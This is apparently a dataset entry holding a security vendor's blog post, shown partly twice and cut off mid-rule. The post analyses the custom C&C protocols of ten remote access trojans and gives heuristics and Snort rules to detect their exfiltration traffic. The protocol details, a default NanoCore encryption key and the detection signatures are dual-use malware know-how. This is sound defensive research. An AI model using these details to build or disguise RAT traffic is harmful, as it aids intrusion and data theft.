description, installed antivirus, etc. Then, a marker and data length are prepended to this data. Finally, collected data is encrypted with single-byte operation of XOR and SUB on each byte. ![](https://lh4.googleusercontent.com/4LbGU33qsv7CmoSQurQlSHwWvXM7Ma3GRLeKAxXQbftHAIkXMF6EW5ucgwBdclY84Zq5-ZY0K1vwARPoCUS7fUUK4C1NTdnVBcF_2t6XwK56x9c4TwsdE5tQoKeteaX_lUESl0NS) *Fig.17: Collected data before encryption and after encryption.* ### **njRAT** Discovered almost a decade ago, njRAT, also known as Bladabindi, is the most active and prevalent remote access trojan. It allows attackers to do surveillance and control the victim's computer. Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. njRAT is mostly found to be delivered via phishing email campaigns containing malicious Word document attachments. It is also found to be delivered by masquerading as a legitimate application installer uploaded to file-sharing services and luring victims via drive-by download campaigns. Since the leak of source code 2013, njRAT has become widely adopted by cybercriminals and APT actors including [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [APT41](https://attack.mitre.org/groups/G0096/). Numerous variants have been detected over the years. Some variants have been found to be communicating over standard HTTP protocol and others were found to be communicating over custom protocols over TCP. The packet begins with data length in a decimal format null-terminated string followed by command and then delimiter followed by exfiltrated data. ![](https://lh6.googleusercontent.com/Q9ONmRNh0G3xnn2RPK3XQs9oRlGKpb8izMFU7exiDBuTNfSuCJxI6FWKlGsCgEN6s3lmozlZapJ3wjin-jZAYFSeQYvJBxvvBpeHe9flzbDgTdAqUeyWDCheWfPpwtyACyfM-rBR) *Fig.18: Fix length first response from C&C server.* ### **Coverage:** Zscaler’s multilayered cloud security platform detects indicators at various levels. The following are the Cloud IPS (non-HTTP/S) signatures that enable detection of the above RATs: [Win32.Backdoor.RemcosRAT](https://threatlibrary.zscaler.com/threats/4461cfa5-4155-499b-a1b5-e866cd05df97) [Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/threats/8e9bd46b-2820-4f49-8b11-8712761e366d) [Win32.Backdoor.CrimsonRAT](https://threatlibrary.zscaler.com/threats/1d5c6832-d582-41cd-a050-e51251663138) [Win32.Backdoor.AsyncRAT](https://threatlibrary.zscaler.com/threats/2a3c4fd0-57d3-4816-8ffe-400f95ba6f37) [Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/threats/3e8d15d9-287b-4ed2-ab16-fa58f7446a59) [Win32.Backdoor.AgentTesla](https://threatlibrary.zscaler.com/threats/35372622-693c-4166-8b6e-ccbf7f669cb5) [Win32.Backdoor.Cybergate](https://threatlibrary.zscaler.com/threats/6430f34a-aece-42ef-9435-c1bcc45a7f4b) [Win32.Backdoor.Nanocore](https://threatlibrary.zscaler.com/threats/51db83e0-80cf-4760-81a9-db4af507a5d8) [Win32.Backdoor.Gh0stRAT](https://threatlibrary.zscaler.com/threats/124cb8b3-bca5-420f-a4c5-71f4450d3ed3) [Win32.Backdoor.NjRat](https://threatlibrary.zscaler.com/threats/5056fbf2-0119-4348-9b26-59feccdd5bb7/) ### **Conclusion** All of the above-discussed RATs are communicating on custom and encrypted protocols over TCP. When communication is encrypted, it is more difficult to scan for their signature patterns in network traffic. However, we have discussed alternative ways to flag RAT traffic based on the heuristics of encrypted data. Four properties that are common to most RAT traffic on non-HTTP/S are: 1.Packets start with a length of encrypted data. Adding 4 to the little endian value of the first 4 should give the total length of TCP data. 2.Entropy of data followed after data length is high. 3.The C&C server responds in the same packet format as the client. 4.Often, server responses have lengths in specific ranges as they send only commands. Snort Rules ----------- *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.CrimsonRat - CNC command""; flow:established,to\_client; content:""|00 00 00 00|""; offset: 1; depth: 4; pcre:""/\x00\x00\x00\x00(thumb|filsz|rupth|dowf|endpo|scrsz|cscreen|dirs|stops|scren|cnls|udlt|delt|afile|listf|file|info|runf|fles|dowr|info|fldr)+=/""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in request""; flow:established,to\_server; dsize:69; content:""|41 00 00 00 99|""; offset:0; depth:5; flowbits:set,ZS.NetwireRAT.Client; flowbits:noalert; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in response""; flow:established,to\_server; dsize:5; content:""|3f 00 00 00 9b|""; flowbits:isset,ZS.NetwireRAT.Client; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.AsyncRAT - Malicious SSL Cert""; flow:established,to\_client; content:""|16 03 01|""; offset:0; depth:3; content:""AsyncRAT""; distance:0; fast\_pattern; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.QuasarRAT - CNC response header""; flow:established,to\_client; dsize:68; content:""|40 00 00 00|""; offset: 0; depth: 4; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.AgentTesla CNC via FTP/SMTP""; flow:established,to\_server; content:""|3C|html|3E|Time|3A|""; content:""|3C|br|3E|User Name|3A|""; content:""|3C|br|3E|Computer Name|3A|""; distance: 0; content: ""|3C|br|3E|OSFullName|3A|""; distance: 0; content:""CPU|3A|""; distance: 0; content:""|3C|br|3E|RAM|3A|""; distance: 0; content: ""URL|3A|""; distance: 0; content: ""Application|3A|""; distance: 0; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> any any (msg:""Zscaler Win32.Backdoor.CyberGate - Data Exfiltration""; flow:established,to\_server; dsize:40<>300; pcre:""/\d{2,3}[#$]{4,6}\x0d\x0a/""; content:""|23 23 24 23 23 0d 0a|""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore Pulse check""; flow:established,to\_server; dsize:12; content:""|08 00 00 00|""; offset: 0; depth: 4; content:""*/*c1 c3 d0 32 43 59 a1 78|""; distance:0; within:8; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (request)""; flow:established,to\_server; flowbits:isset,ZS.NanocoreGen; dsize:12; content:""|08 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; reference:url,https://zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (response)""; flow:established,to\_client; flowbits:noalert; flowbits:set,ZS.NanocoreGen; content:""|20 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; dsize:36; reference:url,https://zscaler.com;)* *alert tcp any any -> any any (msg:""Zscaler Win32.Backdoor.Gh0stRAT - Possible Data Exfil activity""; flow:to\_server,established; byte\_extract:1,10,varbyte; byte\_test:1,!=,varbyte,11; byte\_test:1,=,varbyte,12; byte\_test:1,=,varbyte,13; byte\_test:1,!=,varbyte,15; byte\_extract:4,16,vardword; byte\_test:4,=,vardword,20; byte\_test:4,=,vardword,24; byte\_test:4,=,vardword,28; byte\_test:4,!=,vardword,0; sid:8000031; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|inf""; offset:3; depth:4; pcre:""/\d{1,3}\x00\w{1,3}/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:isset,ZS.njrat; flowbits:unset,ZS.njrat; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|ll""; offset:3; depth:3; pcre:""/^\d{1,3}\x00/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:set,ZS.njrat; flowbits:noalert; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*"
annoctr,annoctr/AnnoCTR/text/train/zscaler_2021-05-05_catching-rats-over-custom-protocols.txt,zscaler_2021-05-05_catching-rats-over-custom-protocols,G0062,"Catching RATs Over Custom Protocols May 05, 2021 Adversaries generally use Standard Application Layer Protocols for communication between malware and command and control (C&C) servers. This is for several reasons: first, malicious traffic blends in more easily with legitimate traffic on standard protocols like HTTP/S; second, companies that rely on appliances for security often don’t inspect all SSL/TLS encrypted traffic as it is extremely resource-intensive to do so. However, the massive growth of SSL attacks – [260% higher in 2020 compared to 2019](/blogs/security-research/2020-state-encrypted-attacks) – has turned many security teams’ attention to these encrypted channels. For those that do inspect their encrypted traffic, modern network security proxies, gateways, and firewalls are evolved enough to conveniently parse application protocols and strip the SSL layer to scan the underlying data. And by knowing the protocol, scan engines using heuristics or machine-learning techniques can more easily differentiate between malicious and legitimate traffic, giving security teams an advantage. These trends have led some adversaries to turn to custom protocols. Although custom protocols for malicious communication are nothing new, almost one-third of prevalent malware families we recently analyzed support communication over non-HTTP/S protocols. Almost all of these malware families are Remote Access Trojans (RATs) and are found all over, from campaigns of mass infection to highly targeted attacks. In this article, we dissect the custom protocols used in some of the most prevalent RATs seen in recent campaigns. At the end, we share a number of signatures and Snort rules that aid in detecting these attacks. Below are statistical representations of traffic that Zscaler blocked for non-HTTP/S C&C communication, as well as the most active RAT families that we observed over a three-month period. ![](https://lh5.googleusercontent.com/aYzD50PDgdfzxXZyjeGnZ1rFbL-b7dYT3UQCAZqIIgf8MAI3Adj4MziWl0n-AuYx6tISUTHpur-YwI9J7Z2s7gKMRX_eLqMUMoDEdQ1NcJYgiHUZNj6taGB_E-S9p0XZ7MhBSPR1) *Fig.1: Hits of top threats communicating over non-HTTP/S in the last quarter.* *![](https://lh5.googleusercontent.com/PriwwYlpzpsb-E89vgyjWguBklqQvrw8j4DN9ttZ_LaIShbiWvvvyVjUw-MgUxV6X-JU_DTOWtl5VGU06GqCY83AsXDuBJee6_cx0egzqKtIVxD7TnkT1-z_frrKimsVbb7Z9ApG)* *Fig.2: Hits of top non-HTTP/S based RAT families in last quarter.* ### **Remcos RAT** Remcos is remote access and surveillance software developed and distributed by an organization called Breaking Security. The Remcos RAT appeared in hacking forums in late 2016. Since then, it has been favored by many cyber criminals and even adopted by APT actors such as the [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [Elfin Group](https://attack.mitre.org/groups/G0064/). Remcos is primarily delivered to victims via malicious attachments in phishing emails. Its capabilities range from logging keystrokes to executing commands, stealing credentials, and capturing microphones and webcams. RC4 key and encrypted configuration data is kept in the resource section “SETTINGS” under “RCData”. The configuration contains the C&C address, port, mutex name, and encryption key for C&C communication. ![](https://lh6.googleusercontent.com/zN7waqVzJ7bcYrfOAkgqH-_czg5hvNth-DIU6ll956XT3r7e49_4CLHbjXWxlnc7D4fCrNd_UIXEW3hKz8K4Wt7lGVLzCuIsbBTcUhFu4JP0n4f4zFXterYWG-HxAva4QI_S5gIo) *Fig.3: Encrypted configuration in resource.* ![](https://lh5.googleusercontent.com/vd-LhD9lYGPqT3Yl_ABwdyq2A0yN5YasLtqsvF_hSua6QkxIMi9MZ0zgtZfpRDpSgUfZmxbCKOcB4G9mUh7VY5uSDjYzUwHl8wjZzk102ApFqJeabOokBoYv0Z3nSZ2b2pOTZZ3d) *Fig.4: Decrypted configuration* Remcos communicates over non-HTTP/S channels/ports on custom protocols. The bot can be configured to communicate in plain text, which makes it fairly straightforward to detect C&C traffic. The custom protocol contains the header “[DataStart]” followed by the size of data and then followed by the exfiltrated data. ![](https://lh5.googleusercontent.com/7wLs8lUEMdYFPShrSwZR0DS-dWkSEznyb1LzuiirRBrwkx_aOfRHBBA9IZi6M3wA_tZ8wmTxQ-nVQQRAXBqHX1bUn9QziriO_-34JLECbcWR-OTBtiG6WhFF2EQQxOYd8qQz_vnB) *Fig.5: Data sent to C&C server in plain text.* However, in most cases, the communication is encrypted using the RC4 algorithm with a key present in the configuration. It is not possible to match signatures in encrypted binary data. However, there is scope for heuristics-based detection. Upon execution, Remcos sends system information to its C&C server, and in return the server replies with commands to execute. As this request and response is encrypted with the same symmetric key, the header “[DataStart]” will generate the same encrypted stream of bytes in place of the header for all communication generated by the executable. ![](https://lh5.googleusercontent.com/ueaF5gjccOqVQVXS2sRGsLoQin-mq3xSkD-SwxC7XZRlQLqmidAWsItAJKXAALu_LIsYjNqovbDiRsM3DRRqSg6lvtdZ9s4SvOJuxehAqyQA6pj0uhLjIdNuwNvOZlUXBinfRIsI) *Fig.6: Data sent to C&C server as RC4 encrypted.* As an example, it can be seen in the above image, a binary stream of bytes “08 b4 de f6 84 27 70 9a 57 17 5e” has taken place of the header “[DataStart]”. The repeated stream pattern of 11 bytes in requests and responses—plus a combination of other heuristics such as entropy and data length limits—can be considered for flagging RC4 encrypted Remcos traffic. ### **Crimson RAT** Crimson RAT has been favored by threat actors for targeted attacks on governments and organizations in the financial, healthcare, and space technology sectors. In 2016, it was found to be used in targeted attacks against Indian diplomatic and military resources. Last year, we found it [targeting Indian financial institutions](/blogs/security-research/targeted-attack-indian-financial-institution-delivers-crimson-rat). Crimson is typically delivered to the victim via a phishing email containing a malicious .doc file or link to a malicious executable. ![](https://lh3.googleusercontent.com/c7KKJMQxQbwMWpqvZ_pJkOGJ6PmWkAp4tsVV3p2Bz3q0URqeSGgeSN9pxCx23208FoGOV4FeHCC6KDY3foKhvH9u1izFykL4QfoUi2Hxgs4rA_Wgtnzh6arhGnzXhGB3hG65-euh) *Fig.7: Data sent to C&C server* ### **NetWire RAT** The NetWire RAT is a malicious tool that emerged almost a decade ago and has been updated many times since then. NetWire has been detected in various campaigns such as [Hydrojiin](/blogs/security-research/look-hydrojiin-campaign) and advanced persistent threat (APT) attacks including [SilverTerrier](https://attack.mitre.org/groups/G0083/) and [The White Company](https://attack.mitre.org/groups/G0089/). Typically, the NetWire RAT is downloaded as a second-stage payload to systems that have been compromised using other malware such as GuLoader. Also, it was found to be delivered via [exploit kits](/blogs/security-research/sundown-chronicles-observations-exploit-kits-evolution). NetWire communicates with custom protocols over TCP and communication is encrypted with AES encryption. Each packet begins with a length of data followed by one byte for the command and then followed by data. The initial packet sends a 32-byte seed value along with 16-byte IV value and hardcoded password specified in the binary to generate the AES key. The C&C server generates a session key for this information. ![](https://lh4.googleusercontent.com/usA4f2R1PIROH6JL8hvC6FHrb_GuwbBcM3LO2F6hudKGMeEyRfB3Waea5wyfE3nSlk6MyqzXj0SE6t05M4etgOhBwOGYJ_pa2Akv4hN8S34D4S3CRVALYkQwBGqdRCThxlk9ZHrk) *Fig.8: Data sent to C&C server as AES encrypted.* As the communication is AES encrypted, it is not possible to scan for signature patterns in communication. However, there is enough information in the initial packet to flag the traffic as NetWire C&C communication. ### **AsyncRAT** AsyncRAT is an open-source RAT designed to remotely monitor and control other computers through a secure encrypted connection. AsyncRAT provides functionality such as keylogger, screen viewer, command execution, and many more. Because of its feature of secure communication, AsyncRAT is used for malicious motives by cybercriminals and weaponized in APT campaigns such as ""[Operation Spalax](https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/). AsyncRAT has been found to be delivered via various methods such as spear-phishing, malvertising, and exploit kits. AsyncRAT communicates over secure TCP channels. As the custom certificate is carried in the binary itself and matched against the C&C certificate, it is not possible to strip the TLS layer at the proxy/gateway level. However, such custom certificates can be filtered out and communication can be blocked by other preventing controls. ![](https://lh6.googleusercontent.com/BNgh3pB-hE3i75fI2LSr9VK7ePZZBZCsiph1M5US6SA0Bbpxa16uuoyrATQTg3bxHjUbU7Ioe65psbtZBq0_Wt9JzweADaAdhdmck0S9UAt6ildONREL6uTwxoyARwUHLznCo48P) *Fig.9: Server certificate having subject and issuer name as “AsyncRAT Server”* #### **Quasar RAT** Quasar is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors including “[Gorgon Group](https://attack.mitre.org/groups/G0078/)” and “[Patchwork](https://attack.mitre.org/groups/G0040/). Its features include remote desktop, keylogging, password stealing, and many more. Quasar encrypts communications using an AES algorithm with a pre-shared key hardcoded in the client binary. It is not possible to scan for signature patterns on AES-encrypted traffic. However, the distinctive characteristics of encrypted data packets can be leveraged to flag Quasar's AES encrypted traffic. ![](https://lh3.googleusercontent.com/McWJS_eN_K5qholLoB9qdc8ov8DeRV38MG1uGZ-_1F4rRmCrKiFUKo1rrV5YHo4yI1xUPFtw8z-h2sc7F-8C9_bIH8vW1FWxdKL2FVKRXBox2vL71qJsAnhSI4GDRslj74o8f3gI) *Fig.10: Data sent to C&C server as AES encrypted.* The distinctive first 4 bytes of the payload can be used to identify Quasar traffic. Specifically, the first 4 bytes can identify the first packet sent from the server to the client following the TCP handshake. This packet is used to initiate the server/client authentication process. The first 4 bytes of the TCP payload contain ""40 00 00 00"" which is the size of the data that follows in little endian. ### **Agent Tesla RAT** The Agent Tesla RAT has been very active and prevalent. Over the last couple of years, there have been huge ongoing phishing campaigns delivering Agent Tesla RAT. Agent Tesla has evolved over time, varying its behavior from campaign to campaign. Cybercriminals use this RAT to steal user credentials and spy on victims through screenshots, keyboard logging, and clipboard capturing. Credential stealing is supported across various software ranging from browsers to mail clients, VPNs, and wallets. Agent Tesla communicates and exfiltrates data to its C&C server on HTTP, FTP, SMTP, and Telegram API. All collected data is encapsulated into an HTML page, and that HTML page is sent to a C&C over one of the aforementioned protocols. For communication over FTP, the HTML page is sent as a file to an FTP C&C server. The file name is generated in format “PW\_<UserName>\_<OS>\_<Timestamp>.HTML” ![](https://lh5.googleusercontent.com/Y2YwbsGuKtRdA_tsmpFz6qgeMTmxXwe-zF7sgYpReVYihtEZu9w08FFi-yJ5qzMCnwYd4r6fzrGcDDUroOywVfewZonLRNFxZwPQphavAwcr0ADmVNNUqlNrHIi-rJPmfDqtapIU) *Fig.11: Data to be sent via FTP.* ![](https://lh3.googleusercontent.com/8F2MVgT3zx-6rcHGYEHNkJp9wj610xCU0yscksACAnADDhWCNdNZ7sBkzjHrsY1PLAGurtUGTjlBBf4TQTK-P4Jxq42mm0_1A0-LpwsP373wrC6lYZOS9sgarmgIl3Auq8CzRQy0) *Fig.12: Exfiltration over FTP* For communication over SMTP, the HTML page is sent as a mail body to the C&C server. The mail subject is generated in format “PW\_<UserName>/<ComputerName>”. ![](https://lh3.googleusercontent.com/KYoapIP64WbQl-mIxxYgRLvQSfgBJKwb9u8jg2zaJVJgaaSrRvsgJO3Hau49yWAr9H4VeOfc1l5f_viEFHZkKKUwEEyQc1WufV2JPf5vDBjadrOkgLSp1Wcj9hEJrTJ53a7sHfjA) *Fig.13: Exfiltration over SMTP* ### **CyberGate RAT** CyberGate allows an attacker to browse and manipulate files, devices, and settings on the victim's machine as well as download and execute additional malware. It also has a wide range of information-stealing abilities including browser credential theft, keylogging, screen capture, and remote enabling of webcams. The CyberGate RAT communicates on a custom protocol over TCP. CyberGate collects the info as per the command received from the C&C server, compresses data by ZLib, encrypts it by RC4 with a hardcoded key, and then sends it to the C&C server. ![](https://lh5.googleusercontent.com/w7yMadYDfy63uAqE1g1xU9jgXCwXmDTdXnlH9nKlKi6vHxwnMVdpW2yTY_Yc0RENUtNHigOp-bqQ9xcdhsLtcU3gza8f2Gl48_C--ecJSnlc4CIvPjpB1geOiwUYVHBwb8S1Vjmj) *Fig.14: Compressed and Encrypted data sent to C&C.* Packets begin with the data length followed by a marker then by a new line delimiter followed by encrypted data. To flag the CyberGate RAT traffic, a combination of data length, marker, and delimiter can be considered. ### **NanoCore RAT** Though NanoCore RAT emerged almost a decade ago, it is still one of the most prevalent RAT families, and multiple versions have appeared since then. NanoCore RAT is modular malware which comes with plugin support to expand its functionality. Basic plugins feature remote surveillance via remote desktop, monitor webcam, capture audio, etc. Additional plugins have been found to be used for cryptocurrency mining, ransomware attacks, credential stealing, and more. NanoCore RAT has been found to be delivered via phishing emails containing .doc macros that load a NanoCore binary with fileless infection techniques. NanoCore communicates on a custom protocol over TCP and uses the DES algorithm with hardcoded key and IV value to encrypt the communication between bot and its C&C server. The communication packet begins with a 4-byte data length followed by DES-encrypted data of that length. ![](https://lh3.googleusercontent.com/Kmhmv9brGs4R-gbEkuKh4W4GdCVsEFslRyxOrVNV9Rdgpc3wGLEf6QQhviCLHNkMet7yfp1Ft7YSbRSXC0v7_1LsEabrZQeWq2he2ZMpANYPyeCF7G6hLH7ZJqvVBNBM54GlQRXJ) Fig.15: Encrypted data C&C communication It is not possible to scan for patterns in DES-encrypted data. However, we observed that the publicly available bot builder does not have an option for configuring the DES key. Thus, all samples generated from this bot-builder will have the same DES key, which is “722018788C294897”. This results in some encrypted traffic that will be the same across all bots generated using the publicly available bot-builder. One such command from the server is “is alive” which is 0x600; when encrypted with a key it will produce “c1 c3 d0 32 43 59 a1 78”. However, there are other customized bot-builders available underground that allow the user to configure the key. For a more generic detection, we need to check for heuristics of data length value against TCP packet size and entropy of data. The first response from the server will be always 0x24 bytes in length, and the first 4 bytes will always be “20 00 00 00”. This response contains a GUID of plugins that the bot will load. The bot responds back to this with 0x12 bytes data, which will always start with the 4-byte stream “08 00 00 00”. These characteristics can be leveraged for detection. ![](https://lh4.googleusercontent.com/4Az6eIbXS8nGOa0nXeVKw8ahmi2f46MSMsDp0IkUkhyeNdlLIAlDODx-tlGFKh6z6WLf8H18JFnWJAj8mOsAYP2jfo1Hg65SSyPvAJ-ANHCOwMS05rZ5D2LLb-qDoDDvJvnn1Z-w) Fig.16: Fix length first response from C&C server. ### **Gh0st RAT** Gh0st is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors such as “[TA459](https://attack.mitre.org/groups/G0062/)” and “[APT18](https://attack.mitre.org/groups/G0026/)."". Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. The source code of the Gh0stRAT is publicly available and attackers have customized it to suit their needs. Thus, many variants have been discovered. Gh0st communicates on a custom protocol over TCP. It uses a sequential byte-to-byte encryption algorithm to encrypt communication with the C&C server. Upon execution, it collects system data such as system information, version, processor description, installed antivirus, etc. Then, a marker and data length are prepended to this data. Finally, collected data is encrypted with single-byte operation of XOR and SUB on each byte. ![](https://lh4.googleusercontent.com/4LbGU33qsv7CmoSQurQlSHwWvXM7Ma3GRLeKAxXQbftHAIkXMF6EW5ucgwBdclY84Zq5-ZY0K1vwARPoCUS7fUUK4C1NTdnVBcF_2t6XwK56x9c4TwsdE5tQoKeteaX_lUESl0NS) *Fig.17: Collected data before encryption and after encryption.* ### **njRAT** Discovered almost a decade ago, njRAT, also known as Bladabindi, is the most active and prevalent remote access trojan. It allows attackers to do surveillance and control the victim's computer. Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. njRAT is mostly found to be delivered via phishing email campaigns containing malicious Word document attachments. It is also found to be delivered by masquerading as a legitimate application installer uploaded to file-sharing services and luring victims via drive-by download campaigns. Since the leak of source code 2013, njRAT has become widely adopted by cybercriminals and APT actors including [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [APT41](https://attack.mitre.org/groups/G0096/). Numerous variants have been detected over the years. Some variants have been found to be communicating over standard HTTP protocol and others were found to be communicating over custom protocols over TCP. The packet begins with data length in a decimal format null-terminated string followed by command and then delimiter followed by exfiltrated data. ![](https://lh6.googleusercontent.com/Q9ONmRNh0G3xnn2RPK3XQs9oRlGKpb8izMFU7exiDBuTNfSuCJxI6FWKlGsCgEN6s3lmozlZapJ3wjin-jZAYFSeQYvJBxvvBpeHe9flzbDgTdAqUeyWDCheWfPpwtyACyfM-rBR) *Fig.18: Fix length first response from C&C server.* ### **Coverage:** Zscaler’s multilayered cloud security platform detects indicators at various levels. The following are the Cloud IPS (non-HTTP/S) signatures that enable detection of the above RATs: [Win32.Backdoor.RemcosRAT](https://threatlibrary.zscaler.com/threats/4461cfa5-4155-499b-a1b5-e866cd05df97) [Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/threats/8e9bd46b-2820-4f49-8b11-8712761e366d) [Win32.Backdoor.CrimsonRAT](https://threatlibrary.zscaler.com/threats/1d5c6832-d582-41cd-a050-e51251663138) [Win32.Backdoor.AsyncRAT](https://threatlibrary.zscaler.com/threats/2a3c4fd0-57d3-4816-8ffe-400f95ba6f37) [Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/threats/3e8d15d9-287b-4ed2-ab16-fa58f7446a59) [Win32.Backdoor.AgentTesla](https://threatlibrary.zscaler.com/threats/35372622-693c-4166-8b6e-ccbf7f669cb5) [Win32.Backdoor.Cybergate](https://threatlibrary.zscaler.com/threats/6430f34a-aece-42ef-9435-c1bcc45a7f4b) [Win32.Backdoor.Nanocore](https://threatlibrary.zscaler.com/threats/51db83e0-80cf-4760-81a9-db4af507a5d8) [Win32.Backdoor.Gh0stRAT](https://threatlibrary.zscaler.com/threats/124cb8b3-bca5-420f-a4c5-71f4450d3ed3) [Win32.Backdoor.NjRat](https://threatlibrary.zscaler.com/threats/5056fbf2-0119-4348-9b26-59feccdd5bb7/) ### **Conclusion** All of the above-discussed RATs are communicating on custom and encrypted protocols over TCP. When communication is encrypted, it is more difficult to scan for their signature patterns in network traffic. However, we have discussed alternative ways to flag RAT traffic based on the heuristics of encrypted data. Four properties that are common to most RAT traffic on non-HTTP/S are: 1.Packets start with a length of encrypted data. Adding 4 to the little endian value of the first 4 should give the total length of TCP data. 2.Entropy of data followed after data length is high. 3.The C&C server responds in the same packet format as the client. 4.Often, server responses have lengths in specific ranges as they send only commands. Snort Rules ----------- *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.CrimsonRat - CNC command""; flow:established,to\_client; content:""|00 00 00 00|""; offset: 1; depth: 4; pcre:""/\x00\x00\x00\x00(thumb|filsz|rupth|dowf|endpo|scrsz|cscreen|dirs|stops|scren|cnls|udlt|delt|afile|listf|file|info|runf|fles|dowr|info|fldr)+=/""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in request""; flow:established,to\_server; dsize:69; content:""|41 00 00 00 99|""; offset:0; depth:5; flowbits:set,ZS.NetwireRAT.Client; flowbits:noalert; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in response""; flow:established,to\_server; dsize:5; content:""|3f 00 00 00 9b|""; flowbits:isset,ZS.NetwireRAT.Client; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.AsyncRAT - Malicious SSL Cert""; flow:established,to\_client; content:""|16 03 01|""; offset:0; depth:3; content:""AsyncRAT""; distance:0; fast\_pattern; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.QuasarRAT - CNC response header""; flow:established,to\_client; dsize:68; content:""|40 00 00 00|""; offset: 0; depth: 4; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.AgentTesla CNC via FTP/SMTP""; flow:established,to\_server; content:""|3C|html|3E|Time|3A|""; content:""|3C|br|3E|User Name|3A|""; content:""|3C|br|3E|Computer Name|3A|""; distance: 0; content: ""|3C|br|3E|OSFullName|3A|""; distance: 0; content:""CPU|3A|""; distance: 0; content:""|3C|br|3E|RAM|3A|""; distance: 0; content: ""URL|3A|""; distance: 0; content: ""Application|3A|""; distance: 0; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> any any (msg:""Zscaler Win32.Backdoor.CyberGate - Data Exfiltration""; flow:established,to\_server; dsize:40<>300; pcre:""/\d{2,3}[#$]{4,6}\x0d\x0a/""; content:""|23 23 24 23 23 0d 0a|""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore Pulse check""; flow:established,to\_server; dsize:12; content:""|08 00 00 00|""; offset: 0; depth: 4; content:""*/*c1 c3 d0 32 43 59 a1 78|""; distance:0; within:8; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (request)""; flow:established,to\_server; flowbits:isset,ZS.NanocoreGen; dsize:12; content:""|08 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; reference:url,https://zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (response)""; flow:established,to\_client; flowbits:noalert; flowbits:set,ZS.NanocoreGen; content:""|20 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; dsize:36; reference:url,https://zscaler.com;)* *alert tcp any any -> any any (msg:""Zscaler Win32.Backdoor.Gh0stRAT - Possible Data Exfil activity""; flow:to\_server,established; byte\_extract:1,10,varbyte; 